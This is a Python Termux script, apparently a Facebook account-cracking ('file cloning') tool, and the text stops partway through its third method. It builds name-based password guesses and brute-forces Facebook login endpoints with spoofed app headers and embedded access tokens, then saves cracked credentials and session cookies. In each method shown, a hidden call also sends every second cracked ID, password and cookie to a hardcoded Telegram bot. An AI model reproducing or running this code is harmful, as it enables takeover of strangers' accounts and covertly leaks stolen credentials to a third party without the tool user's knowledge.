#!/data/data/com.termux/files/usr/bin/python3.12
# -*- coding: utf-8 -*-
#REVISED BY S. TEMO
#----------------\<-IMPORT-MODULE->/----------------#
import os, sys, platform, time, random, uuid, json, string, base64, re, hashlib
from os import system
from io import BytesIO
from time import localtime as lt
from pip._vendor import requests
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from urllib.parse import quote
#----------------\<-COLOR->/----------------#
G = "\033[1;92m"; W = "\x1b[38;5;15m"; B = "\033[1;34m"
Y = "\x1b[38;5;226m"; A = "\x1b[38;5;123m"; R = "\33[1;91m"
O = "\x1b[38;5;81m"; X = "\x1b[38;5;205m"; P = "\x1b[10;95m"
#----------------\<-STYLE->/----------------#
xp = f"{R}<[{W}●{R}]>{W}"
xp1 = f"{R}<[{W}1{R}]>{W}"
xp2 = f"{R}<[{W}2{R}]>{W}"
xp3 = f"{R}<[{W}3{R}]>{W}"
xp4 = f"{R}<[{W}4{R}]>{W}"
xp5 = f"{R}<[{W}5{R}]>{W}"
xp0 = f"{R}<[{W}0{R}]>{W}"
xpx = f"{R}<[{W}?{R}]>{W}"
xpxx = f"{R}>{W}>{R}>{W}"
#----------------\<-PROXS->/----------------#

#----------------\<-INTERNET->/----------------#
try:
    requests.get("https://www.google.com", timeout=5)
except requests.exceptions.ConnectionError:
    system("clear" if os.name == "posix" else "cls")
    print(f"{xp} NO INTERNET CONNECTION & DON'T TRY TO BYPASS")
    print(f"{R}━"*56)
    sys.exit()
#----------------\<-NO-MODULE->/----------------#

#----------------\<-SYS->/----------------#
sys.stdout.write('\x1b[1;37m\x1b]2; TEMO~JO\x07')
#----------------\<-FILE-PATH->/----------------#

#----------------\<-DATE->/----------------#
__dic__ = {
    '1': 'JANUARY', '2': 'FEBRUARY', '3': 'MARCH', '4': 'APRIL',
    '5': 'MAY', '6': 'JUNE', '7': 'JULY', '8': 'AUGUST',
    '9': 'SEPTEMBER', '10': 'OCTOBER', '11': 'NOVEMBER', '12': 'DECEMBER'
}
__now__ = datetime.now()
__days__ = __now__.day
__months__ = __dic__[str(__now__.month)]
__years__ = __now__.year
__date__ = f'{W}{__days__}{R}/{W}{__months__}{R}/{W}{__years__}'
ltx = int(lt()[3])
a = ltx - 12 if ltx > 12 else ltx
tag = "PM" if ltx > 12 else "AM"
#----------------\<-COUNTRY->/----------------#
#----------------\<-SDCARD PERMISSION->/----------------#
try:
    system("clear" if os.name == "posix" else "cls")
    system("rm -rf /sdcard/.txt > /dev/null 2>&1")
    with open("/sdcard/.txt", "w") as f:
        f.write(" ")
except PermissionError:
    print(f"{xp} WITHOUT STORAGE PERMISSION YOU CANNOT ")
    print(f"{xp} RUN THIS TOOL ALLOW STORAGE PERMISSION ")
    print(f"{R}━"*56)
    system("termux-setup-storage -y > /dev/null 2>&1")
    sys.exit(f"{xp} RUN AGAIN THIS TOOL ")
#----------------\<-CLEAR->/----------------#
def __CLEAR__():
    system("clear" if os.name == "posix" else "cls")
    print(logo)
#----------------\<-LINE->/----------------#
def __LINE__():
    print(f"{R}━"*56)
#----------------\<-UA-NORMAL-MIX->/----------------#
def UA():
    fbav3 = f'{random.randint(191,505)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(39,69)}.{random.randint(64,154)}'
    fbbv3 = str(random.randint(11111111, 99999999))
    density3 = random.choice(['1.0', '1.5', '1.8', '2.0', '2.2', '2.5', '3.0'])
    width3 = random.choice(['720', '1080'])
    height3 = random.choice(['2400', '2340', '2560'])
    fblc3 = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
    fbrv3 = str(random.randint(333333333, 999999999))
    fbcr3 = random.choice(["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.1398.1586 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.8445.1494 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.3940.1328 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.5707.1741 Mobile Safari/537.36"])
    fbmf3 = 'samsung';fbbd3 = 'samsung'
    fbdv3 = random.choice(['SM-J200M', 'SM-A300FU', 'SM-A115U', 'SM-A307G', 'SM-A105G', 'SM-A013M', 'SM-A107M', 'SM-A510M', 'SM-G6200', 'SM-F900U', 'SM-J510H'])
    fbsv3 = f'{random.randint(5,11)}.{random.randint(0,5)}.{random.randint(1,5)}'
    fb3=random.choice(['com.facebook.katana|FB4A','com.facebook.orca|Orca-Android'])
    fban3=fb3.split('|')[1];fbpn3=fb3.split('|')[0]
    bit3 = random.choice(['FBOP/19;FBCA/armeabi-v7a:armeabi;]','FBOP/1;FBCA/arm64-v8a:;]'])
    ___Noor_on_Fire___ = '[FBAN/'+str(fban3)+';FBAV/'+str(fbav3)+';FBBV/'+str(fbbv3)+';FBDM/{density='+str(density3)+',width='+str(width3)+',height='+str(height3)+'};FBLC/'+str(fblc3)+';FBRV/'+str(fbrv3)+';FBCR/'+str(fbcr3)+';FBMF/'+str(fbmf3)+';FBBD/'+str(fbbd3)+';FBPN/'+str(fbpn3)+';FBDV/'+str(fbdv3)+';FBSV/'+str(fbsv3)+';'+str(bit3)+''
    return ___Noor_on_Fire___
#----------------\<-VERSION->/----------------#
versn ='2.0'
#----------------\<-SHORT->/----------------#
xlinex = (f"{R}━"*56)
#----------------\<-LOGO->/----------------#
logo = f"""
{R}┏┓╻┏━┓┏━┓┏┓╻
{W}┃┗┫┃ ┃┃ ┃┃┗┫
{R}╹ ╹┗━┛┗━┛╹ ╹
{xlinex}
{xp} FUTURES  {xpxx} FILE{R}{R}〤{W}CLONE
{xp} TODAYS   {xpxx} {__date__}
{xp} PROGRAM  {xpxx} {W}TEMO{R}〤{W}SHINJAN 
{xlinex}"""
#----------------\<-SELF->/----------------#
class __TEMOJO__:
    def __init__(self) -> None:
        self.loop = 0
        self.oks = []
        self.cps = []
        self.sea = []
        self.nvs = []
        self.twf = []
        self.gen = []
        self.plist = []
        self.__COOKIE__ = []
        self.__CP__ = []
        self.__LOCK__ = []

    #----------------\<-MAIN-MENU->/----------------#
    def __MENU__(self) -> None:
        __CLEAR__()
        print(f"{xp1} FILE CLONING ")
        print(f"{xp2} RANDOM CLONING{R} ({W}SOON{R}) ")
        print(f"{xp0} EXIT TOOLS ")
        __LINE__()
        __MENUC__ = input(f"{xpx} INPUT MENU {xpxx} ")
        if __MENUC__ == "1":
            self.__FILEX__()
        elif __MENUC__ == "2":
            __LINE__()
            print(f"{xp} RANDOM CLONE COMING SOON...! ")
            time.sleep(1.1)
            self.__MENU__()
        elif __MENUC__ == "0":
            __LINE__()
            print(f"{xp} EXIT SUCCESSFULLY ")
            time.sleep(1.1)
            __LINE__()
            sys.exit()
        else:
            __LINE__()
            print(f"{xp} INVALID OPTION TRY AGAIN ")
            time.sleep(1)
            self.__MENU__()
    #----------------\<-FILE-MENU->/----------------#
    def __FILEX__(self) -> None:
        __CLEAR__()
        print(f"{xp} EXAMPLE  {xpxx} {R}/{W}sdcard{R}/{W}ids.txt{R}/{W}OR{R}/{W}File.txt ")
        __LINE__()
        __fileloX__ = input(f"{xpx} INPUT FILE PATH {xpxx} ")
        try:
            if not __fileloX__.startswith("/") and not __fileloX__.startswith("./"):
                __fileXX__ = f"/sdcard/{__fileloX__}"
            else:
                __fileXX__ = __fileloX__
            __fileckX__ = open(__fileXX__, 'r').read().splitlines()
        except FileNotFoundError:
            __LINE__()
            print(f"{xp} FILE NOT FOUND TRY AGAIN ")
            time.sleep(1.2)
            self.__FILEX__()
            return
        except PermissionError:
            __LINE__()
            print(f"{xp} ALLOW STORAGE PERMISSION ")
            time.sleep(1.2)
            __LINE__()
            sys.exit()
        except IOError:
            __LINE__()
            print(f"{xp} FILE READING ERROR TRY AGAIN ")
            time.sleep(1.2)
            self.__FILEX__()
            return

        __CLEAR__()
        print(f"{xp1} METHOD {R}<[{W}GRAPH{R}]>{W}")
        print(f"{xp2} METHOD {R}<[{W}B-GRAPH{R}]>{W}")
        print(f"{xp3} METHOD {R}<[{W}API{R}]>{W}")
        print(f"{xp4} METHOD {R}<[{W}B-API{R}]>{W}")
        __LINE__()
        __METHODF__ = input(f"{xpx} INPUT METHOD {xpxx} ")

        __CLEAR__()
        print(f"{xp1} AUTO PASSLIST ")
        print(f"{xp2} CUSTOM PASSLIST ")
        __LINE__()
        __PASLISTF__ = input(f"{xpx} INPUT PASSLIST {xpxx} ")

        if __PASLISTF__ == "1":
            __CLEAR__()
            print(f"{xp1} AUTO WEAK  PASSLIST ")
            print(f"{xp2} AUTO GOOD  PASSLIST ")
            print(f"{xp3} AUTO VERY GOOD  PASSLIST ")
            print(f"{xp4} AUTO STRONG  PASSLIST ")
            print(f"{xp5} AUTO VERY STRONG   PASSLIST ")
            __LINE__()
            __COUNTRYPAS__ = input(f"{xpx} INPUT PASSLIST {xpxx} ")

            if __COUNTRYPAS__ == "1":
                self.plist.extend(["firstlast", "first last","first", "first112233", "first1234567", "first123456789", "first123456", "first12345678", "first1234", "first123"])
            elif __COUNTRYPAS__ == "2":
                self.plist.extend(["first123", "first@1234", "first@12345", "first786", "first110", "firstlast", "firstlast", "firstlast12", "firstlast123", "firstlast12345", "first@123", "last123", "last12345"])
            elif __COUNTRYPAS__ == "3":
                self.plist.extend(["firstlast", "first last", "first123", "57273200", "59039200", "234567", "708090", "firstlast", "firstlast123", "firstlast1234", "first123", "first2025", "first@", "first@@", "57273200"])
            elif __COUNTRYPAS__ == "4":
                self.plist.extend(["first123", "first12345", "first@123", "first@1234", "first last", "firstlast123", "firstlast@123", "first last123", "first123456789", "first123@", "first123@@", "first12345@"])
            else:
                self.plist.extend(["firstlast","first@","first last@@","firstlast12345","firstlast1234","firstlast@@","firstlast@","first@@"])
        else:
            try:
                __CLEAR__()
                print(f"{xp} ALGERIAN PASSLIST 10{R}/{W}15 LIMIT")
                print(f"{xp} OTHERS COUNTRY PASSLIST 5{R}/{W}10 LIMIT")
                __LINE__()
                __PASSFM__ = int(input(f"{xpx} PASSLIST LIMIT {xpxx} "))
            except:
                __PASSFM__ = 5

            __CLEAR__()
            print(f"{xp} EXAMPLE  {xpxx} firstlast {R}/{W} first12 {R}/{W} first123 ")
            __LINE__()
            for i in range(__PASSFM__):
                self.plist.append(input(f"{xp} ENTER PASSLIST {R}<[{W}{i+1}{R}]> {xpxx} "))

        __CLEAR__()
        print(f"{xp1} AUTO SPEED {R}<[{W}20{R}]> ")
        print(f"{xp2} CUSTOM SPEED ")
        __LINE__()
        __SPEED__ = input(f"{xpx} INPUT SPEED {xpxx} ")

        if __SPEED__ == "1":
            __MAXX__ = 20
        else:
            try:
                __CLEAR__()
                print(f"{xp} MAXIMUM SPEED LIMIT 20-40 ")
                __LINE__()
                __MAXX__ = int(input(f"{xpx} INPUT SPEED {xpxx} "))
            except ValueError:
                __MAXX__ = 40

        __CLEAR__()
        print(f"{xp} DO YOU WANT TO SHOW COOKIE...? ")
        __LINE__()
        __co__ = input(f"{xpx} {R}Y{R}/{W}N {xpxx} ")
        __CLEAR__()
        print(f"{xp} DO YOU WANT TO SHOW CP{R}/{W}2F IDS...? ")
        __LINE__()
        __cps__ = input(f"{xpx} {R}Y{R}/{W}N {xpxx} ")

        self.__COOKIE__.append('y' if __co__.lower() in ['y', 'yes', '1'] else 'n')
        self.__CP__.append('y' if __cps__.lower() in ['y', 'yes', '1'] else 'n')
        with ThreadPool(max_workers=__MAXX__) as __TEMO__:
            __CLEAR__()
            total_ids = str(len(__fileckX__))
            print(f"{xp} TOTAL{R}/{W}IDS {xpxx} {total_ids} ")
            print(f"{xp} IF NO RESULT ON{R}/{W}OFF AIRPLANE MODE")
            __LINE__()
            for user in __fileckX__:
                try:
                    ids, names = user.split('|')
                except ValueError:
                    continue
                passlist = self.plist
                if __METHODF__ == "1":
                    __TEMO__.submit(self.__M1X__, ids, names, passlist)
                elif __METHODF__ == "2":
                    __TEMO__.submit(self.__M2X__, ids, names, passlist)
                elif __METHODF__ == "3":
                    __TEMO__.submit(self.__M3X__, ids, names, passlist)
                elif __METHODF__ == "4":
                    __TEMO__.submit(self.__M4X__, ids, names, passlist)
                elif __METHODF__ == "5":
                    __TEMO__.submit(self.__M5X__, ids, names, passlist)
                else:
                    __TEMO__.submit(self.__M1X__, ids, names, passlist)

        print("\033[1;37m")
        __LINE__()
        print(f"{xp} THE PROCESS HAS COMPLETED...!")
        print(f"{xp} TOTAL OK{R}/{W}2F{R}/{W}CP {xpxx} {G}{len(self.oks)}{R}/{R}{len(self.twf)}{R}/{W}{len(self.cps)}")
        __LINE__()
        print(f"{xp} THANKS FOR USING.....! ")
        sys.exit()

    #----------------\<-FILE-M1-GRAPH->/----------------#
    def __M1X__(self, ids, names, passlist):
        try:
            global loop, oks, cps
            color = random.choice([
                "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
                "\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m",
                "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
            ])
            sys.stdout.write(
                f'\r{xp}{W}-{R}<[{W}MR Faysal{R}-{W}CEO{R}]>{W}-{R}<[{color}{self.loop}{R}/{W}M1{R}]>'
                f'{W}-{R}<[{G}{len(self.oks)}{R}/{R}{len(self.twf)}{R}/{W}{len(self.cps)}{R}]> '
            )
            sys.stdout.flush()

            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
                ln = fn

            for pw in passlist:
                pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
                ua = UA()
                accessToken = random.choice([
                    '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    '256002347743983|374e60f8b9bb6b8cbb30f78030438895'
                ])
                random_seed = random.Random()
                pax = random.choice(["PWD_FB4A", "PWD_BROWSER"])
                adid = ''.join(random_seed.choices(string.hexdigits, k=16))
                device_id = str(uuid.uuid4())
                __locale__ = {
                    "en_US": "US", "en_GB": "GB", "es_ES": "ES", "fr_FR": "FR",
                    "ar_SA": "SA", "bn_BD": "BD", "ja_JP": "JP", "de_DE": "DE", "pt_BR": "BR"
                }
                country_locale = random.choice(list(__locale__.keys()))
                country_code = __locale__[country_locale]
                data = {
                    "adid": adid,
                    "format": "json",
                    "device_id": device_id,
                    "cpl": "true",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "email": ids,
                    "password": f"#{pax}:0:{int(time.time())}:{pas}",
                    "access_token": accessToken,
                    "generate_session_cookies": "1",
                    "advertiser_id": str(uuid.uuid4()),
                    "currently_logged_in_userid": "0",
                    "locale": country_locale,
                    "client_country_code": country_code,
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d"
                }
                headers = {
                    "User-Agent": ua,
                    "Accept-Encoding": "gzip, deflate",
                    "Accept": "*/*",
                    "Connection": "keep-alive",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Host": "graph.facebook.com",
                    "X-FB-Net-HNI": str(random.randint(11111, 99999)),
                    "X-FB-SIM-HNI": str(random.randint(11111, 99999)),
                    "X-FB-Connection-Type": random.choice(["CELL.3G", "WIFI", "MOBILE.LTE", "unknown"]),
                    "X-Tigon-Is-Retry": "False",
                    "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
                    "x-fb-device-group": "5120",
                    "X-FB-Friendly-Name": "ViewerReactionsMutation",
                    "X-FB-Request-Analytics-Tags": "graphservice",
                    "X-FB-HTTP-Engine": "Liger",
                    "X-FB-Client-IP": "True",
                    "X-FB-Server-Cluster": "True",
                    "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62",
                    "Content-Length": "699"
                }
                url = "https://graph.facebook.com/auth/login"
                twf = "Login approval's are on. Expect an SMS shortly with a code to use for log in"

                try:
                    po = requests.post(url, data=data, headers=headers, timeout=10).json()
                except requests.exceptions.Timeout:
                    print(f"\n{R}[-] Timeout error for {ids} / {pas}")
                    continue
                except Exception as e:
                    print(f"\n{R}[-] Exception: {str(e)}")
                    continue

                if 'session_key' in po:
                    ckkk = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                    cookie = f'sb=Cracked.By-FAYSAL_Tool;{ssbb};{ckkk}'
                    print(f'\r{xp}{W}-{R}<{W}[{G}FAYSAL-OK{W}]{R}> {G}' + ids + f'/' + pas + '\033[1;97m')

                    if 'y' in self.__COOKIE__:
                        colorX = random.choice([
                            "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
                            "\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m",
                            "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
                        ])
                        print(f'\r{xp}{W}-{R}<{W}[{R}COOKIE{W}]{R}> {colorX}{cookie}')
                    open('/sdcard/MR Faysal-CEO/FILE/MR Faysal-M1-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
                    self.oks.append(ids)
                    if len(self.oks) % 2 == 0:
                        idspas = f"M1 : {ids}|{pas}|{cookie}"
                        requests.get(f"f'https://api.telegram.org/bot{8599358472:AAFuyPk7FNoFfWKsWpZUx8db1wxdcYa76-s}/sendMessage?chat_id={7933962099}&text={idspas}")
                    break

                if twf in str(po):
                    if 'y' in self.__CP__:
                        print(f'\r{xp}{W}-{R}<{W}[{R}FAYSAL-2F{W}]{R}> {R}' + ids + f'/' + pas + '\033[1;97m')

                    open('/sdcard/FAYSAL-CEO/FILE/FAYSAL-M1-2F.txt', 'a').write(ids + '/' + pas + '\n')
                    self.twf.append(ids)
                    break

                if 'www.facebook.com' in po.get('error', {}).get('message', ''):
                    if 'y' in self.__CP__:
                        print(f'\r{xp}{W}-{R}<[{W}FAYSAL-CP{R}]>{W} ' + ids + f' / ' + pas + '\033[1;97m')
                        
                    open('/sdcard/FAYSAL-JO/FILE/FAYSAL-M1-CP.txt', 'a').write(ids + '/' + pas + '\n')
                    self.cps.append(ids)
                    break
                else:
                    continue
            self.loop += 1

        except requests.exceptions.Timeout:
            time.sleep(20)
        except requests.exceptions.ConnectionError:
            time.sleep(20)
        except Exception as e:
            pass
    #----------------\<-FILE-M2-B-GRAPH->/----------------#
    def __M2X__(self, ids, names, passlist):
        try:
            global loop, oks, cps
            color = random.choice([
                "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
                "\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m",
                "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
            ])
            sys.stdout.write(
                f'\r{xp}{W}-{R}<[{W}MR Faysal{R}-{W}CEO{R}]>{W}-{R}<[{color}{self.loop}{R}/{W}M2{R}]>{W}-{R}<[{R}{len(self.oks)}{R}/{R}{len(self.twf)}{R}/{W}{len(self.cps)}{R}]> '
            )
            sys.stdout.flush()
            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
                ln = fn
            for pw in passlist:
                pas = pw.replace('first', fn.lower()) \
                        .replace('First', fn) \
                        .replace('last', ln.lower()) \
                        .replace('Last', ln) \
                        .replace('Name', names) \
                        .replace('name', names.lower())
                ua = UA()
                accessToken = random.choice([
                    '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    '256002347743983|374e60f8b9bb6b8cbb30f78030438895'
                ])
                random_seed = random.Random()
                pax = random.choice(["PWD_FB4A", "PWD_BROWSER"])
                adid = ''.join(random_seed.choices(string.hexdigits, k=16))
                device_id = str(uuid.uuid4())
                __locale__ = {
                    "en_US": "US", "en_GB": "GB", "es_ES": "ES", "fr_FR": "FR",
                    "ar_SA": "SA", "bn_BD": "BD", "ja_JP": "JP", "de_DE": "DE",
                    "pt_BR": "BR"
                }
                country_locale = random.choice(list(__locale__.keys()))
                country_code = __locale__[country_locale]
                data = {
                    'adid': adid,
                    'format': 'json',
                    'device_id': device_id,
                    'email': ids,
                    'password': f"#{pax}:0:{int(time.time())}:{pas}",
                    'generate_analytics_claims': '1',
                    'community_id': '',
                    'cpl': 'true',
                    'try_num': '1',
                    'family_device_id': str(uuid.uuid4()),
                    'credentials_type': 'password',
                    'source': 'login',
                    'error_detail_type': 'button_with_disabled',
                    'enroll_misauth': 'false',
                    'generate_session_cookies': '1',
                    'generate_machine_id': '1',
                    'currently_logged_in_userid': '0',
                    'locale': country_locale,
                    'client_country_code': country_code,
                    'fb_api_req_friendly_name': 'authenticate',
                    'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
                    'access_token': f'{accessToken}',
                }
                headers = {
                    'User-Agent': ua,
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'close',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com',
                    'X-FB-Net-HNI': str(random.randint(11111, 99999)),
                    'X-FB-SIM-HNI': str(random.randint(11111, 99999)),
                    'Authorization': f'OAuth {accessToken}',
                    'X-FB-Connection-Type': random.choice(["CELL.3G", "WIFI", "MOBILE.LTE", "unknown"]),
                    'X-Tigon-Is-Retry': 'False',
                    'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
                    'x-fb-device-group': '5120',
                    'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice',
                    'X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True',
                    'X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',
                }
                url = "https://b-graph.facebook.com/auth/login"
                twf = 'Login approval' + 's are on. ' + 'Expect an SMS' + ' shortly with ' + 'a code to use' + ' for log in'
                po = requests.post(url, data=data, headers=headers).json()
                if 'session_key' in po:
                    ckkk = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                    cookie = f'sb=Cracked.By-FAYSAL_Tool;{ssbb};{ckkk}'
                    print(f'\r{xp}{W}-{R}<{W}[{G}FAYSAL-OK{W}]{R}> {G}' + ids + f'/' + pas + '\033[1;97m')

                    if 'y' in self.__COOKIE__:
                        colorX = random.choice([
                            "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
                            "\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m",
                            "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
                        ])
                        print(f'\r{xp}{W}-{G}<[{R}COOKIE{G}]>{colorX} ' + cookie + '\n')
                    open('/sdcard/FAYSAL-CEO/FILE/FAYSAL-M2-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
                    self.oks.append(ids)
                    if len(self.oks) % 2 == 0:
                        idspas = f"M2 : {ids}|{pas}|{cookie}"
                        requests.get(f"f'https://api.telegram.org/bot{8599358472:AAFuyPk7FNoFfWKsWpZUx8db1wxdcYa76-s}/sendMessage?chat_id={7933962099}&text={idspas}")
                    break
                if twf in str(po):
                    if 'y' in self.__CP__:
                        print(f'\r{xp}{W}-{G}<[{Y}FAYSAL-2F{G}]>{Y} ' + ids + f' / ' + pas + '\033[1;97m')

                    open('/sdcard/FAYSAL-CEO/FILE/FAYSAL-M2-2F.txt', 'a').write(ids + '/' + pas + '\n')
                    self.twf.append(ids)
                    break
                if 'www.facebook.com' in po['error']['message']:
                    if 'y' in self.__CP__:
                        print(f'\r{xp}{W}-{R}<[{W}FAYSAL-CP{R}]>{W} ' + ids + f' / ' + pas + '\033[1;97m')
                        
                    open('/sdcard/FAYSAL-CEO/FILE/FAYSAL-M2-CP.txt', 'a').write(ids + '/' + pas + '\n')
                    self.cps.append(ids)
                    break
                else:
                    continue
            self.loop += 1
        except requests.exceptions.Timeout:
            time.sleep(20)
        except requests.exceptions.ConnectionError:
            time.sleep(20)
        except Exception as e:
            pass

    #----------------\<-FILE-M3-API->/----------------#
    def __M3X__(self, ids, names, passlist):
        try:
            global loop, oks, cps
            color = random.choice([
                "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
                "\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m",
                "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
            ])
            sys.stdout.write(
                f'\r{xp}{W}-{R}<[{W}MR Faysal{R}-{W}CEO{R}]>{W}-{R}<[{color}{self.loop}{R}/{W}M3{R}]>{W}-{R}<[{G}{len(self.oks)}{R}/{R}{len(self.twf)}{R}/{W}{len(self.cps)}{R}]> '
            )
            sys.stdout.flush()
            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
                ln = fn
            for pw in passlist:
                pas = pw.replace('first', fn.lower()) \
                        .replace('First', fn) \
                        .replace('last', ln.lower()) \
                        .replace('Last', ln) \
                        .replace('Name', names) \
                        .replace('name', names.lower())
                ua = UA()
                accessToken = random.choice([
                    '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    '256002347743983|374e60f8b9bb6b8cbb30f78030438895'
                ])
                random_seed = random.Random()
                pax = random.choice(["PWD_FB4A", "PWD_BROWSER"])
                adid = str("".join(random_seed.choices(string.hexdigits, k=16)))
                device_id = str(uuid.uuid4())
                __locale__ = {
                    "en_US": "US", "en_GB": "GB", "es_ES": "ES", "fr_FR": "FR",
                    "ar_SA": "SA", "bn_BD": "BD", "ja_JP": "JP", "de_DE": "DE",
                    "pt_BR": "BR"
                }
                country_locale = random.choice(list(__locale__.keys()))
                country_code = __locale__[country_locale]
                data = {
                    "adid": adid,
                    "format": "json",
                    "device_id": device_id,
                    "cpl": "true",
                    "family_device_id": str(uuid.uuid4()),
                    "credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled",
                    "source": "device_based_login",
                    "email": ids,
                    "password": f"#{pax}:0:{int(time.time())}:{pas}",
                    "access_token": f"{accessToken}",
                    "generate_session_cookies": "1",
                    "meta_inf_fbmeta": "",
                    "advertiser_id": str(uuid.uuid4()),
                    "currently_logged_in_userid": "0",
                    "locale": country_locale,
                    "client_country_code": country_code,
                    "method": "auth.login",
                    "fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d"
                }
                headers = {
                    "User-Agent": ua,
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Host": "graph.facebook.com",
                    "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                    "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                    "X-FB-Connection-Type": random.choice(["CELL.3G", "WIFI", "MOBILE.LTE", "unknown"]),
                    "X-Tigon-Is-Retry": "False",
                    "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
                    "x-fb-device-group": "5120",
                    "X-FB-Friendly-Name": "ViewerReactionsMutation",
                    "X-FB-Request-Analytics-Tags": "graphservice",
                    "X-FB-HTTP-Engine": "Liger",
                    "X-FB-Client-IP": "True",
                    "X-FB-Server-Cluster": "True",
                    "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62",
                }
                url = "https://api.facebook.com/auth/login"
                twf = 'Login approval' + 's are on. ' + 'Expect an SMS' + ' shortly with ' + 'a code to use' + ' for log in'
                po = requests.post(url, data=data, headers=headers).json()
                if 'session_key' in po:
                    ckkk = ';'.join(i['name'] + '=' + i['value'] for i in po['session_cookies'])
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                    cookie = f'sb=Cracked.By-FAYSAL_Tool;{ssbb};{ckkk}'
                    print(f'\r{xp}{W}-{R}<{W}[{G}FAYSAL-OK{W}]{R}> {G}' + ids + f'/' + pas + '\033[1;97m')

                    if 'y' in self.__COOKIE__:
                        colorX = random.choice([
                            "\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m",
                            "\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m",
                            "\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"
                        ])
                        print(f'\r{xp}{W}-{G}<[{R}COOKIE{G}]>{colorX} ' + cookie + '\n')
                    open('/sdcard/MR Faysal-CEO/FILE/FAYSAL-M3-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
                    self.oks.append(ids)
                    if len(self.oks) % 2 == 0:
                        idspas = f"M3 : {ids}|{pas}|{cookie}"
                        requests.get(f"f'https://api.telegram.org/bot{8599358472:AAFuyPk7FNoFfWKsWpZUx8db1wxdcYa76-s}/sendMessage?chat_id={7933962099}&text={idspas}")
                    break
                if twf in str(po):
                    if 'y' in self.__CP__:
